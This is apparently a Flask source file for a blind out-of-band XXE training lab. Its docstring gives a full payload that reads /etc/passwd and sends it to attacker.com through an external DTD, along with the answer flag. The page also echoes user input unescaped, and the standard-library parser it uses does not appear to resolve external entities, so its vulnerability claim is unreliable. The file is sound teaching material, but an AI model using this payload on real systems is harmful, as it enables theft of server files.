"""
XXE Lab 7: Blind XXE (Out-of-Band)
Difficulty: 3 (Advanced)
Points: 100

Description:
Blind XXE with out-of-band data exfiltration.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: Blind XXE with out-of-band exfiltration
    
    Attack Vector:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
    ]>
    <foo/>
    
    evil.dtd contains:
    <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
    %all;
    %send;
    
    Data exfiltrated in HTTP request to attacker server
    
    Flag: FLAG{xxe_blind_oob_007}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = "XML parsed (blind XXE may have executed)"
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>Blind XXE (Out-of-Band)</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<p>{result}</p>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5007, debug=False)
